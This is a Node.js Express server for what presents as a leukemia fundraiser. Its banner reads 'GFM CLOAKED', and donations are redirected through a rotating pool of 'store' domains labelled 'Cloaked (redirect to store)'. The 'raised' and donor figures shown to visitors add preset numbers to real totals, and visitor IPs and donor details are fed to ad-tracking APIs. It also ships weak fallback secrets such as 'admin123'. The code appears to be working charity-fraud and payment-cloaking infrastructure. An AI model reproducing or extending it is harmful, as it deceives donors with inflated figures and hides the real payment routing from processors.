require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const {
  getRecentRealDonations,
  getCampaignRealStats,
  getAllCustomers,
  getCustomerDetails,
  getAllPayments,
  getPaymentDetails,
  getAdminDashboardStats,
  getRecentFailures,
  deleteCustomer,
  toggleCustomerStatus,
  updateCustomerNotes,
  getRandomGradient,
  getInitials,
  getTimeBasedAnalytics,
  getDeviceBrowserAnalytics,
  createDonationToken,
  getNextStore,
  getStoreStats,
  toggleStoreStatus
} = require('./lib/supabase');
const {
  trackEvent,
  trackPurchase,
  getTrackingConfig,
  isTrackingEnabled
} = require('./lib/tracking');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'hoperise-admin-secret-key';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const CALLBACK_SECRET = process.env.CALLBACK_SECRET || 'change-me';

const ACTIVE_CAMPAIGN = process.env.ACTIVE_CAMPAIGN || 'leukemia-sofia';
const MERCHANT_COUNTRY = process.env.MERCHANT_COUNTRY || 'GR';

function generateFBP() {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 11) + Math.random().toString(36).substring(2, 11);
  return `fb.1.${timestamp}.${random}`;
}

const DEFAULT_LANGUAGE = process.env.DEFAULT_LANGUAGE || 'en';

const CURRENCY = process.env.CURRENCY || 'USD';
const CURRENCY_CONFIG = {
  USD: { code: 'USD', symbol: '$', position: 'before', locale: 'en-US', presetAmounts: [10, 25, 50, 100, 250, 500], defaultAmount: 50 },
  EUR: { code: 'EUR', symbol: '€', position: 'before', locale: 'it-IT', presetAmounts: [10, 25, 50, 100, 250, 500], defaultAmount: 50 },
  PLN: { code: 'PLN', symbol: 'zł', position: 'after', locale: 'pl-PL', presetAmounts: [40, 100, 200, 500, 1000, 2000], defaultAmount: 200 }
};
const ACTIVE_CURRENCY = CURRENCY_CONFIG[CURRENCY] || CURRENCY_CONFIG.USD;

function fmtCurrency(amount) {
  const s = ACTIVE_CURRENCY.symbol;
  return ACTIVE_CURRENCY.position === 'after' ? `${amount}${s}` : `${s}${amount}`;
}

function getAllCampaignFiles(dir) {
  let results = [];
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      results = results.concat(getAllCampaignFiles(fullPath));
    } else if (entry.name.endsWith('.json')) {
      results.push(fullPath);
    }
  }
  return results;
}

function loadCampaignFromFile(campaignSlug) {
  const campaignsDir = path.join(__dirname, 'campaigns');
  const allFiles = getAllCampaignFiles(campaignsDir);
  const match = allFiles.find(f => path.basename(f) === `${campaignSlug}.json`);
  if (!match) return null;
  return JSON.parse(fs.readFileSync(match, 'utf-8'));
}

function getClientInfo(req) {
  let ip = req.body?.clientLocation?.ip ||
           req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.ip ||
           req.connection?.remoteAddress ||
           'unknown';
  ip = ip.replace(/^::ffff:/, '');

  return {
    ipAddress: ip,
    userAgent: req.headers['user-agent'] || 'unknown',
    referer: req.headers.referer || req.headers.referrer || 'direct',
    clientLocation: req.body?.clientLocation || null
  };
}

function getTimestamp() {
  return new Date().toLocaleTimeString('en-GB', { hour12: false, timeZone: 'Europe/Athens' });
}

const visitors = new Map();

function generateVisitorId(ip) {
  const hash = crypto.createHash('md5')
    .update(ip + Date.now().toString().slice(-6))
    .digest('hex');
  return `v-${hash.substring(0, 6)}`;
}

function isLocalIP(ip) {
  return ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip === 'unknown';
}

function getOrCreateVisitor(ip, location) {
  const isLocal = isLocalIP(ip);

  if (visitors.has(ip)) {
    const visitor = visitors.get(ip);
    visitor.eventCount++;
    if (location?.city && location.city !== 'Unknown' && visitor.city === 'Local') {
      visitor.city = location.city;
      visitor.country = location.countryCode || location.country || visitor.country;
    }
    return { visitor, isNew: false };
  }

  const visitor = {
    id: generateVisitorId(ip),
    ip: ip,
    city: isLocal ? 'Local' : (location?.city || 'Unknown'),
    country: isLocal ? 'DEV' : (location?.countryCode || location?.country || '??'),
    firstSeen: Date.now(),
    eventCount: 1
  };
  visitors.set(ip, visitor);

  if (visitors.size > 1000) {
    const oldest = [...visitors.entries()]
      .sort((a, b) => a[1].firstSeen - b[1].firstSeen)[0];
    visitors.delete(oldest[0]);
  }

  return { visitor, isNew: true };
}

const EVENT_CONFIG = {
  'PageView': { emoji: '👤', type: 'NEW_VISITOR' },
  'ViewContent': { emoji: '👀', type: 'VIEW_CONTENT' },
  'AddToCart': { emoji: '🛒', type: 'ADD_TO_CART' },
  'InitiateCheckout': { emoji: '💳', type: 'CHECKOUT' },
  'AddPaymentInfo': { emoji: '📝', type: 'PAYMENT_INFO' },
  'Purchase': { emoji: '✅', type: 'PURCHASE' }
};

const PAYMENT_EVENT_CONFIG = {
  'card_error': { emoji: '❌', type: 'CARD_ERROR', msg: 'Card payment error' },
  'card_validation': { emoji: '⚠️', type: 'CARD_INVALID', msg: 'Card validation failed' },
  'card_3ds_cancel': { emoji: '🔐', type: '3DS_CANCELLED', msg: '3DS verification cancelled' },
  'modal_close': { emoji: '🚪', type: 'MODAL_CLOSED', msg: 'Modal closed without payment' },
  'checkout_abandon': { emoji: '🏃', type: 'ABANDONED', msg: 'Left during checkout' },
  'session_timeout': { emoji: '⏱️', type: 'TIMEOUT', msg: 'Session timed out' },
  'redirect_initiated': { emoji: '🔀', type: 'REDIRECT', msg: 'Redirecting to checkout' }
};

const JourneyLog = {
  formatLocation(visitor) {
    if (visitor.city && visitor.city !== 'Unknown') {
      return `${visitor.city}, ${visitor.country}`;
    }
    return visitor.country !== '??' ? visitor.country : visitor.ip.substring(0, 12);
  },

  formatCAPI(status) {
    if (!status) return '';
    return `| Meta ${status.meta} TikTok ${status.tiktok}`;
  },

  event(visitor, eventName, message, capiStatus) {
    const config = EVENT_CONFIG[eventName] || { emoji: 'ℹ️', type: eventName.toUpperCase() };
    const loc = this.formatLocation(visitor);
    const capi = this.formatCAPI(capiStatus);
    console.log(`[${getTimestamp()}] ${config.emoji} ${config.type.padEnd(15)} │ ${visitor.id} │ ${loc.padEnd(12)} │ ${message} ${capi}`);
  },

  newVisitor(visitor, page, capiStatus) {
    const loc = this.formatLocation(visitor);
    const capi = this.formatCAPI(capiStatus);
    console.log(`[${getTimestamp()}] 👀 NEW_VISITOR      │ ${visitor.id} │ ${loc.padEnd(12)} │ Viewing campaign ${capi}`);
  },

  purchase(visitor, amount, storeDomain, capiStatus) {
    const loc = this.formatLocation(visitor);
    const capi = this.formatCAPI(capiStatus);
    console.log(`[${getTimestamp()}] ✅ PURCHASE         │ ${visitor.id} │ ${loc.padEnd(12)} │ ${fmtCurrency(amount)} via ${storeDomain} ${capi}`);
  },

  paymentEvent(visitor, eventType, details) {
    const config = PAYMENT_EVENT_CONFIG[eventType] || { emoji: '❓', type: 'UNKNOWN', msg: 'Unknown event' };
    const loc = this.formatLocation(visitor);
    const detailStr = details ? ` - ${details}` : '';
    console.log(`[${getTimestamp()}] ${config.emoji} ${config.type.padEnd(15)} │ ${visitor.id} │ ${loc.padEnd(12)} │ ${config.msg}${detailStr}`);
  },

  system(emoji, message) {
    console.log(`[${getTimestamp()}] ${emoji} ${message}`);
  },

  startup(port, campaign, currency, language, trackingStatus) {
    console.log('');
    console.log('\x1b[36m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[36m║\x1b[0m           🔒 \x1b[1mGFM CLOAKED\x1b[0m - Campaign Server                                    \x1b[36m║\x1b[0m');
    console.log('\x1b[36m╠═══════════════════════════════════════════════════════════════════════════════╣\x1b[0m');
    console.log(`\x1b[36m║\x1b[0m  🌐 Server:   http://localhost:${String(port).padEnd(45)}\x1b[36m║\x1b[0m`);
    console.log(`\x1b[36m║\x1b[0m  📋 Campaign: ${campaign.padEnd(52)}\x1b[36m║\x1b[0m`);
    console.log(`\x1b[36m║\x1b[0m  🌍 Language: ${language.padEnd(52)}\x1b[36m║\x1b[0m`);
    console.log(`\x1b[36m║\x1b[0m  💳 Payment:  ${'Cloaked (redirect to store)'.padEnd(52)}\x1b[36m║\x1b[0m`);
    console.log(`\x1b[36m║\x1b[0m  💰 Currency: ${currency.padEnd(52)}\x1b[36m║\x1b[0m`);
    console.log(`\x1b[36m║\x1b[0m  📊 Tracking: ${trackingStatus.padEnd(52)}\x1b[36m║\x1b[0m`);
    console.log('\x1b[36m╠═══════════════════════════════════════════════════════════════════════════════╣\x1b[0m');
    console.log('\x1b[36m║\x1b[0m  \x1b[2mLog: [TIME] EMOJI EVENT │ VISITOR-ID │ LOCATION │ MESSAGE\x1b[0m                    \x1b[36m║\x1b[0m');
    console.log('\x1b[36m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('');
  }
};

app.use(express.json());
app.use(cookieParser());

app.use((req, res, next) => {
  if (!req.cookies._fbp) {
    const fbp = generateFBP();
    res.cookie('_fbp', fbp, {
      maxAge: 7 * 24 * 60 * 60 * 1000,
      httpOnly: false,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'None',
      path: '/'
    });
  }
  next();
});

function adminAuth(req, res, next) {
  const token = req.cookies.admin_token;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try {
    jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

app.use('/locales', express.static(path.join(__dirname, 'locales'), {
  setHeaders: (res) => {
    res.set('Content-Type', 'application/json');
    res.set('Cache-Control', 'public, max-age=3600');
  }
}));

app.use(express.static(path.join(__dirname, 'public'), {
  index: false
}));

app.get('/api/language/config', (req, res) => {
  res.json({ defaultLanguage: DEFAULT_LANGUAGE });
});

app.get('/api/currency/config', (req, res) => {
  res.json({ ...ACTIVE_CURRENCY, countryCode: MERCHANT_COUNTRY });
});

app.get('/api/tracking/config', (req, res) => {
  const config = getTrackingConfig();
  const fbp = req.cookies._fbp || null;
  res.json({ ...config, fbp });
});

app.post('/api/track', async (req, res) => {
  if (!isTrackingEnabled()) {
    return res.json({ success: true, message: 'Tracking not configured' });
  }

  const clientInfo = getClientInfo(req);
  const { event, eventId, sourceUrl, cookies, clientLocation, data } = req.body;

  const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, clientLocation);

  const userData = {
    fbp: cookies?.fbp || null,
    fbc: cookies?.fbc || null,
    ttp: cookies?.ttp || null,
    ttclid: cookies?.ttclid || null,
    externalId: null
  };

  const eventData = {
    eventId,
    sourceUrl: sourceUrl || `https://${req.get('host') || 'hoperise.online'}/`,
    value: data?.value,
    currency: data?.currency || ACTIVE_CURRENCY.code,
    contentName: data?.contentName,
    contentType: data?.contentType
  };

  try {
    if (event === 'PageView') {
      await trackEvent(event, eventData, userData, clientInfo);
      return res.json({ success: true });
    }

    const capiStatus = await trackEvent(event, eventData, userData, clientInfo);

    if (event === 'ViewContent') {
      JourneyLog.newVisitor(visitor, new URL(sourceUrl || 'https://hoperise.online/').pathname, capiStatus);
    } else {
      const eventMessages = {
        'AddToCart': 'Opened donation modal',
        'InitiateCheckout': `Started checkout (${fmtCurrency(data?.value || '?')})`,
        'AddPaymentInfo': 'Entering payment details',
        'Purchase': 'Completed donation'
      };
      JourneyLog.event(visitor, event, eventMessages[event] || event, capiStatus);
    }

    res.json({ success: true });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.post('/api/track/payment-event', (req, res) => {
  const clientInfo = getClientInfo(req);
  const { eventType, details, amount, paymentMethod, clientLocation } = req.body;

  const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, clientLocation);

  let detailStr = details || '';
  if (amount) {
    detailStr = `${fmtCurrency(amount)}${paymentMethod ? ` via ${paymentMethod}` : ''}${details ? ` - ${details}` : ''}`;
  }

  JourneyLog.paymentEvent(visitor, eventType, detailStr);
  res.json({ success: true });
});

app.post('/api/init-donation', async (req, res) => {
  const clientInfo = getClientInfo(req);
  const { amount, tip = 0, isAnonymous = false, donorEmail = null, tracking = null } = req.body;

  try {
    if (!amount || amount < 0.50) {
      return res.status(400).json({ error: 'Invalid donation amount' });
    }

    const store = await getNextStore();
    if (!store) {
      return res.status(503).json({ error: 'No active stores available' });
    }

    const token = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();

    await createDonationToken({
      token,
      amount: parseFloat(amount),
      currency: ACTIVE_CURRENCY.code,
      campaignSlug: ACTIVE_CAMPAIGN,
      storeId: store.id,
      language: DEFAULT_LANGUAGE,
      tipAmount: parseFloat(tip),
      isAnonymous,
      donorEmail,
      tracking: tracking || {},
      ipAddress: clientInfo.ipAddress,
      userAgent: clientInfo.userAgent,
      expiresAt
    });

    const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, req.body?.clientLocation);
    JourneyLog.paymentEvent(visitor, 'redirect_initiated', `${fmtCurrency(amount)} → ${store.domain}`);

    const storeBase = process.env.DEV_STORE_URL || `https://${store.domain}`;
    const redirectUrl = `${storeBase}/s/${token}`;
    res.json({ redirectUrl });
  } catch (error) {
    console.error('Init donation error:', error);
    res.status(500).json({ error: 'Failed to initialize donation' });
  }
});

app.post('/api/payment-callback', async (req, res) => {
  const { secret, tokenId, paymentData } = req.body;

  if (secret !== CALLBACK_SECRET) {
    return res.status(403).json({ error: 'Invalid callback secret' });
  }

  try {
    if (isTrackingEnabled() && paymentData) {
      const clientInfo = {
        ipAddress: paymentData.ipAddress || 'unknown',
        userAgent: paymentData.userAgent || 'unknown',
        clientLocation: null
      };

      const tracking = paymentData.tracking || {};
      const trackingData = {
        eventId: tracking.eventId || paymentData.stripeChargeId,
        sourceUrl: tracking.sourceUrl || `https://${req.get('host') || 'hoperise.online'}/`,
        fbp: tracking.fbp || null,
        fbc: tracking.fbc || null,
        ttp: tracking.ttp || null,
        ttclid: tracking.ttclid || null
      };

      try {
        await trackPurchase({
          amount: paymentData.amount,
          currency: paymentData.currency,
          donationType: 'one-time',
          captureId: paymentData.stripeChargeId,
          cardHolderName: paymentData.cardHolderName,
          donorNameReal: paymentData.donorNameReal,
          donorEmail: paymentData.donorEmail,
          customerId: paymentData.customerId
        }, trackingData, clientInfo);
      } catch (err) {
        console.error('CAPI tracking error (non-critical):', err.message);
      }
    }

    const { visitor } = getOrCreateVisitor(
      paymentData?.ipAddress || 'unknown',
      null
    );
    JourneyLog.purchase(
      visitor,
      paymentData?.amount || 0,
      paymentData?.storeDomain || 'unknown',
      { meta: '-', tiktok: '-' }
    );

    res.json({ success: true });
  } catch (error) {
    console.error('Payment callback error:', error);
    res.status(500).json({ error: 'Callback processing failed' });
  }
});

app.get('/api/campaign', async (req, res) => {
  try {
    const campaign = loadCampaignFromFile(ACTIVE_CAMPAIGN);
    if (!campaign) {
      return res.status(404).json({ error: 'Campaign not found' });
    }

    let realStats = { realRaised: 0, realDonorCount: 0 };
    try {
      const [, stats] = await Promise.race([
        Promise.all([
          getRecentRealDonations(ACTIVE_CAMPAIGN, 20),
          getCampaignRealStats(ACTIVE_CAMPAIGN)
        ]),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
      ]);
      realStats = stats;
    } catch (e) {
      console.warn('⚠️ Supabase stats timed out, serving cached campaign data');
    }

    res.json({
      ...campaign,
      raised: (campaign.raised || 0) + realStats.realRaised,
      donorCount: (campaign.donorCount || 0) + realStats.realDonorCount,
      _realStats: {
        realRaised: realStats.realRaised,
        realDonorCount: realStats.realDonorCount
      }
    });
  } catch (error) {
    console.error('Error loading campaign:', error);
    res.status(500).json({ error: 'Failed to load campaign data' });
  }
});

app.get('/api/campaigns', async (req, res) => {
  try {
    const campaignsDir = path.join(__dirname, 'campaigns');
    const files = getAllCampaignFiles(campaignsDir);

    const campaigns = await Promise.all(files.map(async filePath => {
      const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
      const realStats = await getCampaignRealStats(data.id);
      return {
        id: data.id,
        title: data.title,
        raised: (data.raised || 0) + realStats.realRaised,
        goal: data.goal
      };
    }));

    res.json({ active: ACTIVE_CAMPAIGN, campaigns });
  } catch (error) {
    console.error('Error listing campaigns:', error);
    res.status(500).json({ error: 'Failed to list campaigns' });
  }
});

app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
    res.cookie('admin_token', token, { httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid password' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  res.clearCookie('admin_token');
  res.json({ success: true });
});

app.get('/api/admin/check', adminAuth, (req, res) => {
  res.json({ authenticated: true });
});

app.get('/api/admin/dashboard', adminAuth, async (req, res) => {
  try {
    const campaignFilter = req.query.campaign || 'all';
    const startDate = req.query.startDate;
    const endDate = req.query.endDate;
    const dateRange = (startDate && endDate) ? { startDate, endDate } : null;

    const realStats = await getAdminDashboardStats(
      campaignFilter === 'all' ? null : campaignFilter,
      dateRange
    );

    const recentPayments = await getAllPayments(campaignFilter === 'all' ? null : campaignFilter);

    const recentDonors = recentPayments.slice(0, 10).map(p => ({
      id: p.id,
      name: p.name,
      displayName: p.displayName,
      amount: p.amount,
      currency: p.currency,
      time: p.date,
      initials: p.initials,
      color: p.color,
      transactionId: p.stripeChargeId,
      cardBrand: p.cardBrand,
      cardLastDigits: p.cardLastDigits,
      donationType: p.donationType,
      isAnonymous: p.isAnonymous,
      campaign: p.campaign,
      storeDomain: p.storeDomain
    }));

    const campaignsDir = path.join(__dirname, 'campaigns');
    const campaignFiles = getAllCampaignFiles(campaignsDir);
    const campaigns = campaignFiles.map(f => {
      const data = JSON.parse(fs.readFileSync(f, 'utf-8'));
      return { id: data.id, title: data.title, goal: data.goal };
    });

    const currentCampaign = loadCampaignFromFile(ACTIVE_CAMPAIGN);

    res.json({
      title: campaignFilter === 'all' ? 'All Campaigns' : (currentCampaign?.title || campaignFilter),
      goal: currentCampaign?.goal || 0,
      raised: realStats?.raised || 0,
      tips: realStats?.tips || 0,
      gross: realStats?.gross || 0,
      fees: realStats?.fees || 0,
      net: realStats?.net || 0,
      donorCount: realStats?.donorCount || 0,
      avgDonation: realStats?.avgDonation || 0,
      transactionCount: realStats?.transactionCount || 0,
      baseCurrency: realStats?.baseCurrency || 'EUR',
      currencyBreakdown: realStats?.currencyBreakdown || {},
      recentDonors,
      campaigns,
      campaignBreakdown: realStats?.campaignBreakdown || {},
      filters: {
        campaign: campaignFilter,
        startDate: startDate || null,
        endDate: endDate || null
      }
    });
  } catch (error) {
    console.error('Error loading dashboard:', error);
    res.status(500).json({ error: 'Failed to load data' });
  }
});

app.get('/api/admin/analytics/time', adminAuth, async (req, res) => {
  try {
    const campaignFilter = req.query.campaign || 'all';
    const startDate = req.query.startDate;
    const endDate = req.query.endDate;
    const dateRange = (startDate && endDate) ? { startDate, endDate } : null;

    const timeAnalytics = await getTimeBasedAnalytics(
      campaignFilter === 'all' ? null : campaignFilter,
      dateRange
    );
    res.json(timeAnalytics || {});
  } catch (error) {
    console.error('Error loading time analytics:', error);
    res.status(500).json({ error: 'Failed to load time analytics' });
  }
});

app.get('/api/admin/analytics/device', adminAuth, async (req, res) => {
  try {
    const campaignFilter = req.query.campaign || 'all';
    const startDate = req.query.startDate;
    const endDate = req.query.endDate;
    const dateRange = (startDate && endDate) ? { startDate, endDate } : null;

    const deviceAnalytics = await getDeviceBrowserAnalytics(
      campaignFilter === 'all' ? null : campaignFilter,
      dateRange
    );
    res.json(deviceAnalytics || {});
  } catch (error) {
    console.error('Error loading device analytics:', error);
    res.status(500).json({ error: 'Failed to load device analytics' });
  }
});

app.get('/api/admin/stores', adminAuth, async (req, res) => {
  try {
    const stores = await getStoreStats();
    res.json(stores);
  } catch (error) {
    console.error('Error loading stores:', error);
    res.status(500).json({ error: 'Failed to load stores' });
  }
});

app.post('/api/admin/stores/:id/toggle', adminAuth, async (req, res) => {
  try {
    const { status } = req.body;
    const result = await toggleStoreStatus(req.params.id, status);
    res.json(result);
  } catch (error) {
    console.error('Error toggling store:', error);
    res.status(500).json({ error: 'Failed to toggle store' });
  }
});

app.get('/api/admin/customers', adminAuth, async (req, res) => {
  try {
    const customers = await getAllCustomers();
    res.json(customers);
  } catch (error) {
    console.error('Error loading customers:', error);
    res.status(500).json({ error: 'Failed to load customers' });
  }
});

app.get('/api/admin/customers/:id', adminAuth, async (req, res) => {
  try {
    const details = await getCustomerDetails(req.params.id);
    if (!details) return res.status(404).json({ error: 'Customer not found' });
    res.json(details);
  } catch (error) {
    console.error('Error loading customer details:', error);
    res.status(500).json({ error: 'Failed to load customer details' });
  }
});

app.get('/api/admin/transactions', adminAuth, async (req, res) => {
  try {
    const payments = await getAllPayments(ACTIVE_CAMPAIGN);
    res.json(payments);
  } catch (error) {
    console.error('Error loading transactions:', error);
    res.status(500).json({ error: 'Failed to load transactions' });
  }
});

app.get('/api/admin/transactions/:id', adminAuth, async (req, res) => {
  try {
    const details = await getPaymentDetails(req.params.id);
    if (!details) return res.status(404).json({ error: 'Transaction not found' });
    res.json(details);
  } catch (error) {
    console.error('Error loading transaction details:', error);
    res.status(500).json({ error: 'Failed to load transaction details' });
  }
});

app.get('/api/admin/failures', adminAuth, async (req, res) => {
  try {
    const failures = await getRecentFailures(50);
    res.json(failures);
  } catch (error) {
    console.error('Error loading failures:', error);
    res.status(500).json({ error: 'Failed to load failures' });
  }
});

app.delete('/api/admin/customers/:id', adminAuth, async (req, res) => {
  try {
    const result = await deleteCustomer(req.params.id);
    if (!result.success) return res.status(400).json({ error: result.error });
    res.json(result);
  } catch (error) {
    console.error('Error deleting customer:', error);
    res.status(500).json({ error: 'Failed to delete customer' });
  }
});

app.post('/api/admin/customers/:id/pause', adminAuth, async (req, res) => {
  try {
    const result = await toggleCustomerStatus(req.params.id, 'paused');
    if (!result.success) return res.status(400).json({ error: result.error });
    res.json(result);
  } catch (error) {
    console.error('Error pausing customer:', error);
    res.status(500).json({ error: 'Failed to pause customer' });
  }
});

app.post('/api/admin/customers/:id/resume', adminAuth, async (req, res) => {
  try {
    const result = await toggleCustomerStatus(req.params.id, 'active');
    if (!result.success) return res.status(400).json({ error: result.error });
    res.json(result);
  } catch (error) {
    console.error('Error resuming customer:', error);
    res.status(500).json({ error: 'Failed to resume customer' });
  }
});

app.post('/api/admin/customers/:id/notes', adminAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    const result = await updateCustomerNotes(req.params.id, notes);
    if (!result.success) return res.status(400).json({ error: result.error });
    res.json(result);
  } catch (error) {
    console.error('Error updating notes:', error);
    res.status(500).json({ error: 'Failed to update notes' });
  }
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin', 'login.html'));
});

app.get('*', (req, res) => {
  const trackingConfig = getTrackingConfig();

  let pixelScripts = '';

  if (trackingConfig.enabled) {
    if (trackingConfig.fbPixelId) {
      pixelScripts += `
  <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '${trackingConfig.fbPixelId}');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=${trackingConfig.fbPixelId}&ev=PageView&noscript=1"/></noscript>`;
    }

    if (trackingConfig.tiktokPixelId) {
      pixelScripts += `
  <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
      ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];
      ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
      for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
      ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
      ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";
      ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};
      var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;
      var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
      ttq.load('${trackingConfig.tiktokPixelId}');
    }(window, document, 'ttq');
  </script>`;
    }
  }

  const indexPath = path.join(__dirname, 'public', 'index.html');
  let html = fs.readFileSync(indexPath, 'utf8');
  html = html.replace('<!-- TRACKING_PIXELS_PLACEHOLDER -->', pixelScripts);
  html = html.replace('<!-- GOOGLE_PAY_SDK_PLACEHOLDER -->', '');
  html = html.replace('<!-- PAYMENT_SCRIPT_PLACEHOLDER -->', '');

  if (cachedCampaignJSON) {
    html = html.replace('<!-- CAMPAIGN_DATA_PLACEHOLDER -->', `<script>window.__CAMPAIGN_DATA=${cachedCampaignJSON};</script>`);
  } else {
    html = html.replace('<!-- CAMPAIGN_DATA_PLACEHOLDER -->', '');
  }

  res.send(html);
});

let cachedCampaignJSON = null;

async function refreshCampaignCache() {
  try {
    const campaign = loadCampaignFromFile(ACTIVE_CAMPAIGN);
    if (!campaign) return;

    let realStats = { realRaised: 0, realDonorCount: 0 };
    try {
      const [, stats] = await Promise.race([
        Promise.all([
          getRecentRealDonations(ACTIVE_CAMPAIGN, 20),
          getCampaignRealStats(ACTIVE_CAMPAIGN)
        ]),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 4000))
      ]);
      realStats = stats;
    } catch (_) {}

    cachedCampaignJSON = JSON.stringify({
      ...campaign,
      raised: (campaign.raised || 0) + realStats.realRaised,
      donorCount: (campaign.donorCount || 0) + realStats.realDonorCount,
      _realStats: { realRaised: realStats.realRaised, realDonorCount: realStats.realDonorCount }
    });
  } catch (e) {
    if (!cachedCampaignJSON) {
      const campaign = loadCampaignFromFile(ACTIVE_CAMPAIGN);
      if (campaign) cachedCampaignJSON = JSON.stringify(campaign);
    }
  }
}

refreshCampaignCache();
setInterval(refreshCampaignCache, 60000);

app.listen(PORT, () => {
  const trackingConfig = getTrackingConfig();
  let trackingStatus = 'DISABLED';
  if (trackingConfig.enabled) {
    const platforms = [];
    if (trackingConfig.fbPixelId) platforms.push('Meta');
    if (trackingConfig.tiktokPixelId) platforms.push('TikTok');
    trackingStatus = platforms.join(' + ') + ' (ENABLED)';
  }
  const langMap = { el: 'Greek', it: 'Italian', pt: 'Portuguese', pl: 'Polish', es: 'Spanish', fr: 'French', en: 'English' };
  const langDisplay = `${langMap[DEFAULT_LANGUAGE] || DEFAULT_LANGUAGE} (${DEFAULT_LANGUAGE})`;
  JourneyLog.startup(PORT, ACTIVE_CAMPAIGN, `${ACTIVE_CURRENCY.code} (${ACTIVE_CURRENCY.symbol})`, langDisplay, trackingStatus);
});
